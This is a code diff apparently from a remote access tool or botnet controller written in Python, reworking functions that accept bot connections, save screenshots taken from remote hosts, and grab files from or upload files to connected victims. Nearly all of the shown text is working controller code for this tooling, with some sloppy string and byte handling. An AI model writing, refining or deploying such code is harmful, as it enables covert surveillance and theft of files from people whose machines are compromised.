@@ -59,7 +59,6 @@ def session(conn):
 				conn.close()
 				remove(conn)
 				return
-
 		elif 'upload*' in command:
 			try:
 				transferupload(conn,command)
@@ -223,11 +222,8 @@ def botconnect():
         list_of_clientaddr.append(addr)
         if flag==True:
             print(Fore.GREEN)
-            print("\n [+] incoming connection " + addr[0] + " connected")       
+            print("\n [+] incoming connection " + addr[0] + " connected")
             print(Style.RESET_ALL)
-       
-        
-          
 
 def screenshot(conn,command):
     global imageno
@@ -247,8 +243,6 @@ def screenshot(conn,command):
             print(Fore.GREEN)
             print("[+]screenshot saved at "+ path)   
             print(Style.RESET_ALL)
-       
-            
             f.close()
             break
     
@@ -256,34 +250,32 @@ def screenshot(conn,command):
 
 def transfergrab(conn,command):
 	conn.send(command.encode())
-	grab,filename=command.split('*')
-	path=os.getcwd()+"/"
-	path += filename
-	bits=conn.recv(1024)
-	msg=bits.decode()
-	if "The File Doesn't Exist" in msg:
-
+	grab,path=command.split('*')
+	fpath=os.getcwd()+"/"
+	fpath += os.path.basename(path)
+	bits=conn.recv(1024).decode()
+	if "The File Doesn't Exist" in bits:
 		print(Fore.RED)
 		print("[-]The File Doesn't Exist")   
 		print(Style.RESET_ALL)
-	elif "DIR" in msg:
+	elif "DIR" in bits:
 		print(Fore.YELLOW)
 		print("[-]Cannot grab a Directory")
 		print(Style.RESET_ALL)
-	elif "ERROR" in msg:
+	elif "ERROR" in bits:
 		print(Fore.RED)
 		print("[-]Some error occured at remote host")
 		print(Style.RESET_ALL)
 
 	else:
-		f=open(path,'wb+')
+		f=open(fpath,'w')
 		while True:
 				f.write(bits)
-				bits=conn.recv(1024)
-				msg=bits.decode()
-				if "DONE" in msg:
+				bits=conn.recv(1024).decode()
+				if bits.endswith("DONE"):
+					f.write(bits.strip("DONE"))
 					print(Fore.GREEN)
-					print("[+]File Transfer Complete")   
+					print("[+]File Transfer Complete and saved at CWD")   
 					print(Style.RESET_ALL)
 					f.close()
 					break
@@ -292,33 +284,36 @@ def transfergrab(conn,command):
 
 
 def transferupload(conn,command):
-    print(Fore.YELLOW)
-    print("[+] YOU HAVE INVOKED THE UPLOAD COMMAND")
-    print("[+] THE FILE MUST BE IN YOUR CURRENT WORKING DIRECTORY")
-    print(Style.RESET_ALL)
-    upload,fname=command.split('*')
-    if os.path.exists(fname):
+	print(Fore.YELLOW)
+	print("[+] YOU HAVE INVOKED THE UPLOAD COMMAND")
+	print(Style.RESET_ALL)
+	upload,path=command.split('*')
+	if os.path.exists(path):
+		if os.path.isfile(path):
+			conn.send(command.encode())
+			print(Fore.BLUE)
+			print("[+]UPLOADING")
+			print(Style.RESET_ALL)
         
-        conn.send(command)
-        print(Fore.BLUE)
-        print("[+]UPLOADING")
-        print(Style.RESET_ALL)
-        
-        f=open(fname,'rb')
-        f.seek(0)
-        packet=f.read(1024)
-        while packet!='':
-            conn.send(packet)
-            packet=f.read(1024)
-        conn.send("DONE")
-        f.close()
-        print(Fore.GREEN)
-        print("[+]UPLOAD SUCCESSFULL")
-        print(Style.RESET_ALL)
-    else:
-        print(Fore.RED)
-        print("[-]The File Doesn't Exist")
-        print(Style.RESET_ALL)
+			f=open(path,'rb')
+			f.seek(0)
+			packet=f.read(1024)
+			while packet!='':
+				conn.send(packet)
+				packet=f.read(1024)
+			conn.send("DONE")
+			f.close()
+			print(Fore.GREEN)
+			print("[+]UPLOAD SUCCESSFULL")
+			print(Style.RESET_ALL)
+		else:
+			print(Fore.YELLOW)
+			print("[-]Cannot upload a directory")
+			print(Style.RESET_ALL)
+	else:
+		print(Fore.RED)
+		print("[-]The File Doesn't Exist")
+		print(Style.RESET_ALL)
         
         
         
